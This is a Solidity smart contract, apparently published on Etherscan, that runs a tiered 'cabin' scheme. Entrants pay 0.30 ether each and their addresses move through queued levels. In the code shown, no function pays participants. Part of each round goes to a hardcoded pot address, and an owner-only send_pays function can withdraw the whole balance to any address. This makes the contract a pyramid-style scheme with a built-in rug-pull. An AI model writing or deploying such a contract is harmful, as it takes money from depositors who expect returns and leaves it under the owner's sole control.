/**
 *Submitted for verification at Etherscan.io on 2020-07-29
*/

pragma solidity ^0.4.24;
 /**
     ____
     \\  `.
      \\   `.
       \ \   `.
        \\JETH`.
        :. . . . `._______________________.-~|~~-._
        \                                 ---'-----`-._
         /"""""""/             _...---------..         ~-._________
        //     .`_________  .-`           \ .-~           /
       //    .'       ||__.~             .-~_____________/
      //___.`           .~            .-~
                      .~           .-~
                    .~         _.-~
                    `-_____.-~'
 */
contract Jeth_Contract {
    
 address private owner;
 address private Cover=0x8eb4d21cc91b3d4052153Cde8B8096bc0F4ED8a0;
 address private Jeth_pot=0x9d4eb5bF95AB0195c27C87DB18AB43aedFCB2680;
 address private rein;
 
 address[]private tourist_cabin_1;
 address[]private tourist_cabin_2;
 address[]private tourist_cabin_3;
 address[]private tourist_cabin_4;
 address[]private tourist_cabin_5;
 address[]private tourist_cabin_6;
 
 address[]private executive_cabin_1;
 address[]private executive_cabin_2;
 address[]private executive_cabin_3;
 address[]private executive_cabin_4;
 address[]private executive_cabin_5;
 address[]private executive_cabin_6;
 
 
address[]private first_class_cabin_1;
address[]private first_class_cabin_2; 
address[]private first_class_cabin_3;
address[]private first_class_cabin_4; 
address[]private first_class_cabin_5;
address[]private first_class_cabin_6;
     constructor() public{
        owner = msg.sender;
    }
    function enter() public payable {
        require(msg.value== 0.30 ether);
        tourist_cabin_1.push(msg.sender);
        if(tourist_cabin_1.length>=4){
           reinvestment(tourist_cabin_1,tourist_cabin_2, tourist_cabin_1[0] );
        }
        if(tourist_cabin_2.length>=4){
           reinvestment(tourist_cabin_2,tourist_cabin_3, tourist_cabin_2[0] );
        }
         if(tourist_cabin_3.length>=4){
           reinvestment(tourist_cabin_3,tourist_cabin_4, tourist_cabin_3[0] );
        }
         if(tourist_cabin_4.length>=4){
           reinvestment(tourist_cabin_4,tourist_cabin_5, tourist_cabin_4[0] );
        }
         if(tourist_cabin_5.length>=4){
           reinvestment(tourist_cabin_5,tourist_cabin_6, tourist_cabin_5[0] );
        }
         if(tourist_cabin_6.length>=4){
           reinvestment(tourist_cabin_6,executive_cabin_1, tourist_cabin_6[0] );
           send_owner(200000000000000000);
        }
        
    }
    
    function send_owner(uint amount) private{
        Jeth_pot.transfer(amount); 
    }
    
    function reinvestment(address[] storage  actual,address[] storage  camino, address valor ) private{
        rein=valor;
        camino.push(rein);
        exit(actual);
        actual.push(rein);
    }
    
    function exit(address[] storage  cabin) private returns(address[]) {
        uint index=0;
        if (index >= cabin.length) return;
        for (uint i = index; i<cabin.length-1; i++){
            cabin[i] = cabin[i+1];
        }
        cabin.length--;
        return cabin;
    
    }
    
    function getBalance() public view returns(uint){
       address jeth=this;
       return jeth.balance;
        
    }
    
    function getTraveler() public view returns (address[]) {
        return tourist_cabin_1;
    }
    
      function getTraveler1() public view returns (address[]) {
        return tourist_cabin_2;
    }
 
    function send_pays(uint amount,address to)public isowner{
        require(address(this).balance >=amount);
        require(to != address(0));
        to.transfer(amount);
    }
    modifier isowner(){
        require(msg.sender==owner);
        _;
    }
}